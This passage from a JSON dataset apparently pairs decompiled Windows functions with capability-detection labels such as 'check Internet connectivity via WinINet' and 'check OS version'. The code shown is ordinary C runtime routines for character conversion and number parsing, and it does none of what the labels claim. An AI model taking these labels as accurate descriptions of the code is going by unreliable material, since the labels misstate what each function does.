    },
    "0041d370": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0041d370(uint16_t *param_1, uint32_t *param_2, uint32_t param_3, uint32_t *param_4, int32_t param_5, \n                 uint32_t param_6)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t auStack16 [2];\n    \n    if (param_2 == NULL) {\n        return 0;\n    }\n    if (param_3 == 0) {\n        return 0xfffffffe;\n    }\n    uVar1 = *param_2;\n    auStack16[0] = *param_4;\n    *param_4 = 0;\n    if (uVar1 == 0) {\n        *param_1 = 0;\n        return 0;\n    }\n    if (param_6 < 2) {\ncode_r0x0041d432:\n        if (param_5 == 0) {\n            *param_1 = *param_2;\n            return 1;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(param_5, 8, param_2, 1, param_1, 1);\n        if (iVar2 != 0) {\n            return 1;\n        }\n    }\n    else {\n        if (auStack16[0] == '\\0') {\n            iVar2 = (*_sym.imp.KERNEL32.dll_IsDBCSLeadByteEx)(param_5, uVar1);\n            if (iVar2 == 0) goto code_r0x0041d432;\n            if (param_3 < 2) {\n                *param_4 = *param_2;\n                return 0xfffffffe;\n            }\n        }\n        else {\n            auStack16[0]._0_2_ = CONCAT11(uVar1, auStack16[0]);\n            auStack16[0] = auStack16[0] & 0xffff0000 | auStack16[0];\n            param_2 = auStack16;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(param_5, 8, param_2, 2, param_1, 1);\n        if (iVar2 != 0) {\n            return 2;\n        }\n    }\n    puVar3 = sub.msvcrt.dll__errno();\n    *puVar3 = 0x2a;\n    return 0xffffffff;\n}\n",
        "token_count": 556
    },
    "0041d6c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint8_t * __cdecl fcn.0041d6c0(uint8_t *arg_8h, float10 *arg_ch)\n\n{\n    float10 fVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    uint8_t **ppuVar5;\n    int32_t iVar6;\n    uint8_t *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint32_t uVar10;\n    uint8_t *puVar11;\n    uint8_t *puVar12;\n    uint *puVar13;\n    uint16_t uVar14;\n    uint32_t uVar15;\n    uint16_t *apuStack192 [2];\n    float10 *pfStack184;\n    uint16_t *puStack180;\n    uint32_t auStack176 [6];\n    uint32_t var_94h;\n    uint *var_90h;\n    int32_t var_8ch;\n    uint32_t var_88h;\n    int32_t var_84h;\n    uint32_t var_80h;\n    uint32_t var_7ch;\n    uint32_t var_78h;\n    ushort var_72h;\n    uint32_t var_70h;\n    uint32_t var_6ch;\n    uint8_t *var_68h;\n    uint *var_64h;\n    int32_t var_60h;\n    uint8_t *var_5ch;\n    uint var_4eh;\n    uint var_4ah;\n    uint var_46h;\n    uint var_42h;\n    uint var_3eh;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint16_t var_28h;\n    uint var_ch;\n    \n    apuStack192[0] = 0x41d6d4;\n    ppuVar5 = sub.msvcrt.dll_localeconv();\n    apuStack192[1] = arg_8h;\n    var_70h = var_70h & 0xffffff00 | **ppuVar5;\n    apuStack192[0] = 0x41d6e4;\n    iVar6 = sub.msvcrt.dll_strlen();\n    var_5ch = iVar6 + 2;\n    apuStack192[0] = 0x41d6f5;\n    iVar6 = fcn.00418950();\n    iVar6 = -iVar6;\n    var_68h = &fcn.0041d6c0::var_94h + iVar6 + 3 & 0xfffffff0;\n    puVar7 = arg_8h;\n    while( true ) {\n        var_60h = puVar7 - arg_8h;\n        uVar3 = *puVar7;\n        *(&stack0xffffff44 + iVar6) = uVar3;\n        *(&stack0xffffff40 + iVar6) = 0x41d71c;\n        var_84h = sub.msvcrt.dll_isspace();\n        if (var_84h == 0) break;\n        puVar7 = puVar7 + 1;\n    }\n    puVar12 = var_68h;\n    if (0 < var_5ch) {\n        *var_68h = uVar3;\n        puVar12 = var_68h + 1;\n        if (uVar3 != 0) {\n            var_5ch = puVar7 + var_5ch;\n            puVar11 = var_68h + 1;\n            do {\n                puVar7 = puVar7 + 1;\n                puVar12 = puVar11;\n                if (puVar7 == var_5ch) break;\n                uVar3 = *puVar7;\n                *puVar11 = uVar3;\n                puVar12 = puVar11 + 1;\n                puVar11 = puVar11 + 1;\n            } while (uVar3 != 0);\n        }\n    }\n    *puVar12 = 0;\n    if (*var_68h == 0x2d) {\n        var_72h = 0xffff;\n        var_5ch = var_68h + 1;\n    }\n    else {\n        var_72h = 0;\n        var_5ch = var_68h;\n        if (*var_68h == 0x2b) {\n            var_5ch = var_68h + 1;\n        }\n    }\n    puVar12 = var_5ch;\n    *(&stack0xffffff4c + iVar6) = 3;\n    *(&stack0xffffff44 + iVar6) = 0x505b20;\n    *(&stack0xffffff48 + iVar6) = puVar12;\n    *(&stack0xffffff40 + iVar6) = 0x41d79b;\n    iVar8 = sub.msvcrt.dll__strnicmp();\n    puVar7 = var_5ch;\n    if (iVar8 == 0) {\n        *(&stack0xffffff4c + iVar6) = 5;\n        *(&stack0xffffff44 + iVar6) = \"INITY\";\n        *(&stack0xffffff48 + iVar6) = puVar12 + 3;\n        *(&stack0xffffff40 + iVar6) = 0x41d7bf;\n        iVar8 = sub.msvcrt.dll__strnicmp();\n        var_4ah._0_2_ = 0;\n        var_4ah._2_2_ = 0;\n        var_46h._0_2_ = 0;\n        var_46h._2_2_ = 0;\n        puVar7 = puVar12 + 3;\n        if (iVar8 == 0) {\n            puVar7 = puVar12 + 8;\n        }\n        *(&stack0xffffff44 + iVar6) = &fcn.0041d6c0::var_4eh;\n        var_3eh._0_2_ = 0;\n        var_42h._0_2_ = 0;\n        var_42h._2_2_ = 0;\n        var_4eh._2_2_ = 0x7fff;\n        var_4eh._0_2_ = var_72h;\n        *(&stack0xffffff48 + iVar6) = arg_ch;\n        *(&stack0xffffff40 + iVar6) = 0x41d800;\n        fcn.00421360();\n        var_5ch = puVar7;\n        goto code_r0x0041d800;\n    }\n    *(&stack0xffffff4c + iVar6) = 3;\n    *(&stack0xffffff44 + iVar6) = 0x505b2a;\n    *(&stack0xffffff48 + iVar6) = puVar7;\n    *(&stack0xffffff40 + iVar6) = 0x41d82f;\n    iVar8 = sub.msvcrt.dll__strnicmp();\n    if (iVar8 == 0) {\n        puVar7 = puVar7 + 3;\n        var_4eh._2_2_ = 0x7fff;\n        var_4ah._0_2_ = 0;\n        var_4ah._2_2_ = 0xc000;\n        var_46h._0_2_ = 0;\n        var_46h._2_2_ = 0;\n        var_42h._0_2_ = 0;\n        var_42h._2_2_ = 0;\n        var_3eh._0_2_ = 0;\ncode_r0x0041d852:\n        var_42h._2_2_ = 0;\n        var_42h._0_2_ = 0;\n        var_46h._2_2_ = 0;\n        var_46h._0_2_ = 0;\n        var_4ah._0_2_ = 0;\n        var_3eh._0_2_ = 0;\n        var_4eh._0_2_ = var_72h;\n        *(&stack0xffffff48 + iVar6) = arg_ch;\n        *(&stack0xffffff44 + iVar6) = &fcn.0041d6c0::var_4eh;\n        *(&stack0xffffff40 + iVar6) = 0x41d86c;\n        fcn.00421360();\n        var_5ch = puVar7;\n        goto code_r0x0041d800;\n    }\n    var_4eh._0_2_ = 0;\n    var_4eh._2_2_ = 0;\n    var_4ah._0_2_ = 0;\n    var_4ah._2_2_ = 0;\n    var_46h._0_2_ = 0;\n    var_46h._2_2_ = 0;\n    var_42h._0_2_ = 0;\n    var_42h._2_2_ = 0;\n    var_3eh._0_2_ = 0;\n    uVar3 = *var_5ch;\n    if (uVar3 == 0x30) {\n        do {\n            var_5ch = var_5ch + 1;\n            uVar3 = *var_5ch;\n        } while (uVar3 == 0x30);\n        var_94h = 1;\n    }\n    else {\n        var_94h = 0;\n    }\n    var_80h = 0;\n    var_78h = 0;\n    var_88h = 0;\n    var_7ch = 0;\n    var_6ch = 0;\ncode_r0x0041d92e:\n    var_64h = uVar3 - 0x30;\n    if (var_64h < 0xa) {\n        if (var_4ah == 0) {\n            var_7ch = (var_7ch + 1) - (var_6ch == 0);\n            uVar15 = 0;\n            puVar9 = &fcn.0041d6c0::var_3eh;\n            do {\n                if (*puVar9 < 0) {\n                    uVar15 = uVar15 | 1;\n                }\n                uVar14 = *puVar9 * 2;\n                if ((uVar15 & 2) != 0) {\n                    uVar14 = uVar14 | 1;\n                }\n                puVar13 = puVar9 + -2;\n                uVar15 = uVar15 * 2;\n                *puVar9 = uVar14;\n                puVar9 = puVar13;\n            } while (puVar13 != &fcn.0041d6c0::var_4eh + 2);\n            iVar8 = &fcn.0041d6c0::var_3eh + 2;\n            var_2ch._0_2_ = 0;\n            uVar15 = 0;\n            var_8ch = iVar8;\n            var_90h = &fcn.0041d6c0::var_2ch;\n            stack0xffffffc0 = CONCAT22(var_4eh._2_2_, var_4eh);\n            var_38h = var_4ah._2_2_ << 0x10;\n            var_34h = CONCAT22(var_46h._2_2_, var_46h);\n            var_30h = CONCAT22(var_42h._2_2_, var_42h);\n            uVar14 = 0;\n            puVar9 = &fcn.0041d6c0::var_2ch;\n            while( true ) {\n                if (uVar14 < 0) {\n                    uVar15 = uVar15 | 1;\n                }\n                uVar4 = uVar14 * 2;\n                if ((uVar15 & 2) != 0) {\n                    uVar4 = uVar14 * 2 | 1;\n                }\n                puVar13 = puVar9 + -2;\n                uVar15 = uVar15 * 2;\n                *puVar9 = uVar4;\n                puVar9 = var_90h;\n                uVar14 = var_4ah;\n                if (puVar13 == &stack0xffffffc2) break;\n                uVar14 = *puVar13;\n                puVar9 = puVar13;\n            }\n            do {\n                if (*puVar9 < 0) {\n                    uVar14 = uVar14 | 1;\n                }\n                uVar4 = *puVar9 * 2;\n                if ((uVar14 & 2) != 0) {\n                    uVar4 = uVar4 | 1;\n                }\n                puVar13 = puVar9 + -2;\n                *puVar9 = uVar4;\n                puVar9 = puVar13;\n                uVar14 = uVar14 * 2;\n            } while (puVar13 != &stack0xffffffc2);\n            *(&stack0xffffff48 + iVar6) = &fcn.0041d6c0::var_4eh;\n            *(&stack0xffffff44 + iVar6) = iVar8;\n            *(&stack0xffffff40 + iVar6) = 0x41da4d;\n            fcn.00420f70();\n            stack0xffffffc0 = 0;\n            var_38h = 0;\n            var_34h = 0;\n    // WARNING: Ignoring partial resolution of indirect\n            var_30h = 0;\n            var_2ch._0_2_ = 0;\n            *(&stack0xffffff44 + iVar6) = iVar8;\n            var_30h = CONCAT22(var_64h._0_2_, var_30h);\n            *(&stack0xffffff48 + iVar6) = &fcn.0041d6c0::var_4eh;\n            *(&stack0xffffff40 + iVar6) = 0x41da85;\n            fcn.00420f70();\n        }\n        else {\n            var_88h = var_88h | var_64h;\n            var_7ch = var_7ch - (var_6ch == 0);\n        }\n        var_80h = var_80h + 1;\n        var_78h = var_78h | var_64h;\ncode_r0x0041d924:\n        var_5ch = var_5ch + 1;\n        uVar3 = *var_5ch;\n        goto code_r0x0041d92e;\n    }\n    if (var_70h == uVar3) {\n        if (var_6ch != 0) goto code_r0x0041dc64;\n        var_6ch = 1;\n        goto code_r0x0041d924;\n    }\n    var_6ch = var_94h | var_80h;\n    if ((uVar3 & 0xdf) != 0x45) goto code_r0x0041daa7;\n    if ((var_94h | var_80h) == 0) {\n        var_84h = 0;\n        goto code_r0x0041daa7;\n    }\n    uVar3 = var_5ch[1];\n    if (uVar3 == 0x2d) {\n        iVar8 = -1;\n        puVar7 = var_5ch + 2;\n        uVar3 = var_5ch[2];\n    }\n    else {\n        puVar7 = var_5ch + 1;\n        iVar8 = 1;\n    }\n    if (uVar3 == 0x2b) {\n        uVar3 = puVar7[1];\n        puVar7 = puVar7 + 1;\n    }\n    if (9 < uVar3 - 0x30) goto code_r0x0041daa7;\n    do {\n        if (var_84h < 0x1372) {\n            var_84h = uVar3 + -0x30 + var_84h * 10;\n        }\n        puVar7 = puVar7 + 1;\n        uVar3 = *puVar7;\n    } while (uVar3 - 0x30 < 10);\n    if (iVar8 == -1) {\n        if (0x1371 < var_84h) {\n            var_4eh._2_2_ = 0;\n            var_4ah._0_2_ = 0;\n            var_4ah._2_2_ = 0;\n            var_46h._0_2_ = 0;\n            var_46h._2_2_ = 0;\n            var_42h._0_2_ = 0;\n            var_42h._2_2_ = 0;\n            var_3eh._0_2_ = 0;\n            var_4eh._0_2_ = var_72h;\n            *(&stack0xffffff48 + iVar6) = arg_ch;\n            *(&stack0xffffff44 + iVar6) = &fcn.0041d6c0::var_4eh;\n            *(&stack0xffffff40 + iVar6) = 0x41e037;\n            fcn.00421360();\n            var_5ch = puVar7;\n            if (var_78h == 0) goto code_r0x0041d800;\n            goto code_r0x0041dc22;\n        }\n        var_5ch = puVar7;\n        var_84h = -var_84h;\ncode_r0x0041daa7:\n        var_70h = var_84h - var_7ch;\n        if (var_84h - var_7ch < 1) {\n            *(&stack0xffffff44 + iVar6) = &fcn.0041d6c0::var_4eh;\n            *(&stack0xffffff40 + iVar6) = 0x41df1f;\n            iVar8 = fcn.004215d0();\n            if (iVar8 < 0x51) {\n                *(&stack0xffffff58 + iVar6) = 0x50;\n                *(&stack0xffffff54 + iVar6) = 0x40;\n                *(&stack0xffffff4c + iVar6) = 0;\n                *(&stack0xffffff50 + iVar6) = 0x404e - iVar8;\n                *(&stack0xffffff48 + iVar6) = var_88h;\n                *(&stack0xffffff44 + iVar6) = &fcn.0041d6c0::var_4eh;\n                *(&stack0xffffff40 + iVar6) = 0x41df62;\n                fcn.00421780();\n                var_7ch = var_4eh._2_2_;\n                if (var_70h != 0) {\n                    if (var_70h < -0x1000) {\n                        uVar15 = &fcn.0041d6c0::var_2ch + 2;\n                        *(&stack0xffffff44 + iVar6) = 0x505b40;\n                        *(&stack0xffffff48 + iVar6) = uVar15;\n                        var_80h = uVar15;\n                        *(&stack0xffffff40 + iVar6) = 0x41dfbf;\n                        fcn.00420eb0();\n                        uVar2 = var_7ch;\n                        uVar10 = var_28h;\n                        *(&stack0xffffff44 + iVar6) = uVar15;\n                        *(&stack0xffffff48 + iVar6) = &fcn.0041d6c0::var_4eh;\n                        *(&stack0xffffff40 + iVar6) = 0x41dfd7;\n                        fcn.00420ff0();\n                        var_84h = -1;\n                        var_7ch = (uVar2 - uVar10) + 0x3fff;\n                        var_70h = -var_70h - 0x1000;\n                    }\n                    else {\n                        var_70h = -var_70h;\n                        var_84h = -1;\n                        var_80h = &fcn.0041d6c0::var_2ch + 2;\n                    }\n                    goto code_r0x0041dd6c;\n                }\n                goto code_r0x0041dce7;\n            }\ncode_r0x0041dbe5:\n            var_4eh._2_2_ = 0;\n            var_4ah._0_2_ = 0;\n            var_4ah._2_2_ = 0;\n            var_46h._0_2_ = 0;\n            var_46h._2_2_ = 0;\n            var_42h._0_2_ = 0;\n            var_42h._2_2_ = 0;\n            var_3eh._0_2_ = 0;\n        }\n        else {\n            if (var_4ah == 0) {\n                var_64h = &fcn.0041d6c0::var_2ch;\n                do {\n                    uVar15 = 0;\n                    stack0xffffffc0 = CONCAT22(var_4eh._2_2_, var_4eh);\n                    var_38h = CONCAT22(var_4ah._2_2_, var_4ah);\n                    var_34h = CONCAT22(var_46h._2_2_, var_46h);\n                    var_30h = CONCAT22(var_42h._2_2_, var_42h);\n                    var_2ch._0_2_ = 0;\n                    uVar14 = 0;\n                    puVar9 = var_64h;\n                    while( true ) {\n                        if (uVar14 < 0) {\n                            uVar15 = uVar15 | 1;\n                        }\n                        uVar4 = uVar14 * 2;\n                        if ((uVar15 & 2) != 0) {\n                            uVar4 = uVar14 * 2 | 1;\n                        }\n                        puVar13 = puVar9 - 2;\n                        uVar15 = uVar15 * 2;\n                        *puVar9 = uVar4;\n                        if (puVar13 == &stack0xffffffc2) break;\n                        uVar14 = *puVar13;\n                        puVar9 = puVar13;\n                    }\n                    uVar15 = 0;\n                    puVar9 = var_64h;\n                    do {\n                        if (*puVar9 < 0) {\n                            uVar15 = uVar15 | 1;\n                        }\n                        uVar14 = *puVar9 * 2;\n                        if ((uVar15 & 2) != 0) {\n                            uVar14 = uVar14 | 1;\n                        }\n                        puVar13 = puVar9 - 2;\n                        uVar15 = uVar15 * 2;\n                        *puVar9 = uVar14;\n                        puVar9 = puVar13;\n                    } while (puVar13 != &stack0xffffffc2);\n                    *(&stack0xffffff48 + iVar6) = &fcn.0041d6c0::var_3eh + 2;\n                    *(&stack0xffffff44 + iVar6) = &fcn.0041d6c0::var_4eh;\n                    *(&stack0xffffff40 + iVar6) = 0x41db67;\n                    fcn.00420f70();\n                    uVar15 = 0;\n                    puVar9 = var_64h;\n                    do {\n                        if (*puVar9 < 0) {\n                            uVar15 = uVar15 | 1;\n                        }\n                        uVar14 = *puVar9 * 2;\n                        if ((uVar15 & 2) != 0) {\n                            uVar14 = uVar14 | 1;\n                        }\n                        puVar13 = puVar9 - 2;\n                        uVar15 = uVar15 * 2;\n                        *puVar9 = uVar14;\n                        puVar9 = puVar13;\n                    } while (puVar13 != &stack0xffffffc2);\n                    if (var_38h != 0) goto code_r0x0041dbd1;\n                    var_70h = var_70h - 1;\n                    var_3eh._0_2_ = 0;\n                    var_4eh._0_2_ = stack0xffffffc0;\n                    var_4eh._2_2_ = stack0xffffffc0 >> 0x10;\n                    var_4ah._2_2_ = var_38h >> 0x10;\n                    var_46h._0_2_ = var_34h;\n                    var_46h._2_2_ = var_34h >> 0x10;\n                    var_42h._0_2_ = var_30h;\n                    var_42h._2_2_ = var_30h >> 0x10;\n                    var_4ah._0_2_ = var_38h;\n                } while (var_70h != 0);\n                *(&stack0xffffff44 + iVar6) = &fcn.0041d6c0::var_4eh;\n                *(&stack0xffffff40 + iVar6) = 0x41dc9f;\n                iVar8 = fcn.004215d0();\n                if (iVar8 < 0x51) {\n                    *(&stack0xffffff58 + iVar6) = 0x50;\n                    *(&stack0xffffff54 + iVar6) = 0x40;\n                    uVar15 = var_88h;\n                    *(&stack0xffffff4c + iVar6) = 0;\n                    *(&stack0xffffff50 + iVar6) = 0x404e - iVar8;\n                    *(&stack0xffffff48 + iVar6) = uVar15;\n                    *(&stack0xffffff44 + iVar6) = &fcn.0041d6c0::var_4eh;\n                    *(&stack0xffffff40 + iVar6) = 0x41dce0;\n                    fcn.00421780();\n                    var_7ch = var_4eh._2_2_;\n                    goto code_r0x0041dce7;\n                }\n                goto code_r0x0041dbe5;\n            }\ncode_r0x0041dbd1:\n            *(&stack0xffffff44 + iVar6) = &fcn.0041d6c0::var_4eh;\n            *(&stack0xffffff40 + iVar6) = 0x41dbdc;\n            iVar8 = fcn.004215d0();\n            if (0x50 < iVar8) goto code_r0x0041dbe5;\n            *(&stack0xffffff58 + iVar6) = 0x50;\n            *(&stack0xffffff54 + iVar6) = 0x40;\n            uVar15 = var_88h;\n            *(&stack0xffffff4c + iVar6) = 0;\n            *(&stack0xffffff50 + iVar6) = 0x404e - iVar8;\n            *(&stack0xffffff48 + iVar6) = uVar15;\n            *(&stack0xffffff44 + iVar6) = &fcn.0041d6c0::var_4eh;\n            *(&stack0xffffff40 + iVar6) = 0x41dd55;\n            fcn.00421780();\n            var_84h = 1;\n            var_7ch = var_4eh._2_2_;\n            var_80h = &fcn.0041d6c0::var_2ch + 2;\ncode_r0x0041dd6c:\n            uVar2 = var_70h;\n            puVar9 = &fcn.0041d6c0::var_3eh + 2;\n            iVar8 = 0x505bd0;\n            uVar15 = 1;\n            stack0xffffffc0 = *0x505bdc;\n            var_38h = *0x505be0;\n            var_34h = *0x505be4;\n            do {\n                if ((uVar2 & uVar15) != 0) {\n                    *(&stack0xffffff4c + iVar6) = puVar9;\n                    *(&stack0xffffff48 + iVar6) = puVar9;\n                    *(&stack0xffffff44 + iVar6) = iVar8;\n                    var_64h = puVar9;\n                    *(&stack0xffffff40 + iVar6) = 0x41ddc4;\n                    fcn.00421b10();\n                    puVar9 = var_64h;\n                }\n                uVar10 = var_80h;\n                iVar8 = iVar8 + -0xc;\n                uVar15 = uVar15 * 2;\n            } while (iVar8 != 0x505b34);\n            *(&stack0xffffff44 + iVar6) = puVar9;\n            *(&stack0xffffff48 + iVar6) = uVar10;\n            *(&stack0xffffff40 + iVar6) = 0x41ddda;\n            fcn.00420eb0();\n            if (var_84h == -1) {\n                iVar8 = var_7ch - var_28h;\n                *(&stack0xffffff48 + iVar6) = &fcn.0041d6c0::var_4eh;\n                *(&stack0xffffff44 + iVar6) = var_80h;\n                *(&stack0xffffff40 + iVar6) = 0x41df03;\n                var_70h = fcn.00420ff0();\n                var_7ch = iVar8 + 0x3fff;\n            }\n            else {\n                iVar8 = var_28h + var_7ch;\n                *(&stack0xffffff48 + iVar6) = &fcn.0041d6c0::var_4eh;\n                *(&stack0xffffff44 + iVar6) = var_80h;\n                *(&stack0xffffff40 + iVar6) = 0x41de00;\n                var_70h = fcn.00421250();\n                var_7ch = iVar8 - 0x3ffe;\n            }\ncode_r0x0041dce7:\n            uVar15 = var_7ch;\n            *(&stack0xffffff58 + iVar6) = 0x40;\n            *(&stack0xffffff54 + iVar6) = 0x40;\n            *(&stack0xffffff4c + iVar6) = 0;\n            *(&stack0xffffff50 + iVar6) = uVar15;\n            *(&stack0xffffff48 + iVar6) = var_70h;\n            *(&stack0xffffff44 + iVar6) = &fcn.0041d6c0::var_4eh;\n            *(&stack0xffffff40 + iVar6) = 0x41dd18;\n            fcn.00421780();\n        }\n        var_4eh._0_2_ = var_72h;\n        *(&stack0xffffff48 + iVar6) = arg_ch;\n        *(&stack0xffffff44 + iVar6) = &fcn.0041d6c0::var_4eh;\n        *(&stack0xffffff40 + iVar6) = 0x41dc1b;\n        fcn.00421360();\n        if (var_78h != 0) goto code_r0x0041dc22;\n    }\n    else {\n        if (var_84h < 0x1372) {\n            var_5ch = puVar7;\n            goto code_r0x0041daa7;\n        }\n        var_4eh._2_2_ = 0;\n        var_4ah._0_2_ = 0;\n        var_4ah._2_2_ = 0;\n        var_3eh._0_2_ = 0;\n        var_46h._0_2_ = 0;\n        var_46h._2_2_ = 0;\n        var_42h._0_2_ = 0;\n        var_42h._2_2_ = 0;\n        if (var_78h == 0) goto code_r0x0041d852;\n        var_4eh._2_2_ = 0x7fff;\n        var_4eh._0_2_ = var_72h;\n        *(&stack0xffffff48 + iVar6) = arg_ch;\n        *(&stack0xffffff44 + iVar6) = &fcn.0041d6c0::var_4eh;\n        *(&stack0xffffff40 + iVar6) = 0x41dee0;\n        fcn.00421360();\n        var_5ch = puVar7;\ncode_r0x0041dc22:\n        fVar1 = *arg_ch;\n        if ((fVar1 == 0) || (((fVar1 != 0) << 10 | (fVar1 == 0) << 0xe) == 0x500)) {\n            *(&stack0xffffff40 + iVar6) = 0x41dc5c;\n            puVar9 = sub.msvcrt.dll__errno();\n            *puVar9 = 0x22;\n        }\n    }\n    if (var_6ch == 0) {\n        return NULL;\n    }\ncode_r0x0041d800:\n    return var_5ch + (var_60h - var_68h);\ncode_r0x0041dc64:\n    var_6ch = var_94h | var_80h;\n    goto code_r0x0041daa7;\n}\n",
        "token_count": 7397
    },
    "0041ead0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall\nfcn.0041ead0(uint32_t *param_1, uint32_t *param_2, uint param_3, uint32_t param_4, int32_t param_5, uint32_t *param_6)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    ulong *in_EAX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    ulong uVar9;\n    uint32_t uStack56;\n    uint32_t uStack52;\n    uint32_t uStack36;\n    uint32_t auStack32 [4];\n    \n    uVar9 = *in_EAX;\n    iVar4 = fcn.00427350(uVar9, auStack32, &uStack36);\n    uVar7 = uVar9 >> 0x20;\n    uVar2 = *param_2;\n    uStack36 = uStack36 - uVar2;\n    auStack32[0] = auStack32[0] + uStack36;\n    if (uStack36 < 1) {\n        if (param_4 == 0) {\n            uVar5 = 0;\n            goto code_r0x0041ebd4;\n        }\n        uStack52 = 0;\n        uStack56 = 0;\n        if (uStack36 != 0) {\n            uVar7 = -uStack36;\n            iVar4 = fcn.00426f00(iVar4, uVar7);\n        }\n    }\n    else if (uVar2 == 0x35) {\n        uVar5 = 0;\n        if ((param_4 == 0) || (param_2[3] != 1)) goto code_r0x0041ebd4;\ncode_r0x0041ed5f:\n        uStack52 = fcn.004276d0(iVar4, uStack36);\n        uVar9 = CONCAT44(uStack36, iVar4);\n        if (uStack52 == 0) {\n            fcn.00426330(iVar4);\n            uVar7 = uVar9 >> 0x20;\n            uStack56 = 0;\n        }\n        else {\ncode_r0x0041ee30:\n            fcn.00426330(uVar9);\n            uVar7 = uVar9 >> 0x20;\n            uStack56 = 0x10;\n        }\n    }\n    else if (param_5 == 1) {\n        uStack52 = fcn.004276d0(iVar4, uStack36);\n        uVar9 = CONCAT44(uStack36, iVar4);\n        if (uStack52 != 0) goto code_r0x0041ee30;\ncode_r0x0041ee8d:\n        fcn.00426330(uVar9);\n        uVar7 = uVar9 >> 0x20;\n        uStack56 = 0;\n    }\n    else {\n        if (param_5 != 2) {\n            uVar5 = uStack36 - 1;\n            if (uVar5 == 0) {\n                uVar5 = 0;\n                if (param_4 == 0) goto code_r0x0041ebd4;\n                if ((*(iVar4 + 0x14) & 2) == 0) goto code_r0x0041ed5f;\n            }\n            else if ((*(iVar4 + 0x14 + (uVar5 >> 5) * 4) >> (uVar5 & 0x1f) & 1) == 0) {\n                uStack52 = fcn.004276d0(iVar4, uStack36);\n                if (uStack52 != 0) {\n                    uVar7 = uStack36;\n                    fcn.00426330(iVar4, uStack36);\n                    uStack56 = 0x10;\n                    goto code_r0x0041ec14;\n                }\n                uVar9 = CONCAT44(uStack36, iVar4);\n                goto code_r0x0041ee8d;\n            }\n        }\n        uStack52 = fcn.004276d0(iVar4, uStack36);\n        uVar7 = uStack36;\n        fcn.00426330(iVar4, uStack36);\n        iVar4 = fcn.0041ea30(iVar4, uVar7);\n        uVar5 = uVar2 & 0x1f;\n        if (uVar5 != 0) {\n            uVar5 = 0x20 - uVar5;\n        }\n        puVar1 = iVar4 + 0x10 + *(iVar4 + 0x10) * 4;\n        uVar3 = 0x1f;\n        if (*puVar1 != 0) {\n            for (; *puVar1 >> uVar3 == 0; uVar3 = uVar3 - 1) {\n            }\n        }\n        if (uVar5 == (uVar3 ^ 0x1f)) {\n            uStack56 = 0x20;\n        }\n        else {\n            if (uStack52 == 0) {\n                uStack52 = *(iVar4 + 0x14) & 1;\n            }\n            uVar7 = 1;\n            fcn.00426330(iVar4, 1);\n            uStack56 = 0x20;\n            auStack32[0] = auStack32[0] + 1;\n        }\n    }\ncode_r0x0041ec14:\n    uVar5 = param_2[1];\n    if (auStack32[0] < uVar5) {\n        iVar8 = uVar5 - auStack32[0];\n        auStack32[0] = uVar5;\n        if ((uVar2 < iVar8) || (uVar5 = param_2[4],  uVar5 != 0)) {\n            *(iVar4 + 0x10) = 0;\n            uStack56 = 0;\n            *param_6 = 0x50;\n            uVar7 = uStack56;\n        }\n        else {\n            uVar3 = iVar8 - 1;\n            if ((0 < uVar3) && (uStack52 == 0)) {\n                uVar7 = uVar3;\n                uStack52 = fcn.004276d0(iVar4, uVar3);\n            }\n            if ((uStack52 | param_4) == 0) goto code_r0x0041ebd4;\n            uVar7 = *(iVar4 + 0x14 + (uVar3 >> 5) * 4);\n            fcn.00426330(iVar4, iVar8);\n            *param_6 = 2;\n            if ((1 << (uVar3 & 0x1f) & uVar7) == 0) {\n                uVar7 = 0x50;\n                if (uStack52 == 0) {\n                    uVar7 = uStack56;\n                }\n            }\n            else {\n                iVar4 = fcn.0041ea30(iVar4, iVar8);\n                uStack56 = 0x60;\n                uVar7 = uStack56;\n            }\n        }\n    }\n    else {\n        uVar7 = uStack56;\n        if (param_2[2] < auStack32[0]) {\n            auStack32[0] = param_2[2] + 1;\n            *param_6 = 0xa3;\n            puVar6 = sub.msvcrt.dll__errno();\n            uStack56 = 0;\n            *puVar6 = 0x22;\n            *(iVar4 + 0x10) = 0;\n            uVar7 = uStack56;\n        }\n    }\n    uStack56 = uVar7;\n    uVar5 = 1;\n    *param_1 = auStack32[0];\n    uVar7 = uVar2;\n    fcn.00427670(param_3, uVar2, iVar4);\n    *param_6 = *param_6 | uStack56;\ncode_r0x0041ebd4:\n    fcn.00426a80(iVar4, uVar7);\n    return uVar5;\n}\n",
        "token_count": 1825
    },
    "0041ef70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
